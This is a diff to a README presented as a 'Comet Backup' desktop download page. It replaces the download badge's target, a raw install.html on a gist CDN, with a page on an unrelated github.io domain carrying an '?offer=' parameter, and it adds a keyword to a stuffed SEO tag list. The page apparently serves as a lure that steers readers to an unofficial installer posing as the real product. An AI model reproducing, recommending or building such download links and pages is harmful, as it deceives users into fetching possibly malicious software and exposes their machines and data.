@@ -1,6 +1,6 @@
 # Comet Backup Download — Desktop Data Protection
 
-[![Get Comet Backup GitHub](https://img.shields.io/badge/Get%20Comet%20Backup%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/supermetal576/2b3ef98f81a53c63a7f980dbb006db8e/raw/d0db079a8906a765924d3b38ea03e70be168142b/install.html?offer=CometBackup)
+[![Get Comet Backup GitHub](https://img.shields.io/badge/Get%20Comet%20Backup%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CometBackup)
 
 ---
 
@@ -69,7 +69,7 @@ A: The system supports incremental and versioned backups.
 ---
 
 ## 🔍 Tags
-comet backup, desktop backup tool, encrypted data restore, cloud backup pc mac, backup scheduling utility, comet backup pc, comet backup windows, comet backup desktop, comet backup for mac, comet backup for pc, comet backup for windows, comet backup mac
+comet backup, cometbackup, desktop backup tool, encrypted data restore, cloud backup pc mac, backup scheduling utility, comet backup pc, comet backup windows, comet backup desktop, comet backup for mac, comet backup for pc, comet backup for windows, comet backup mac
 
 ---
 
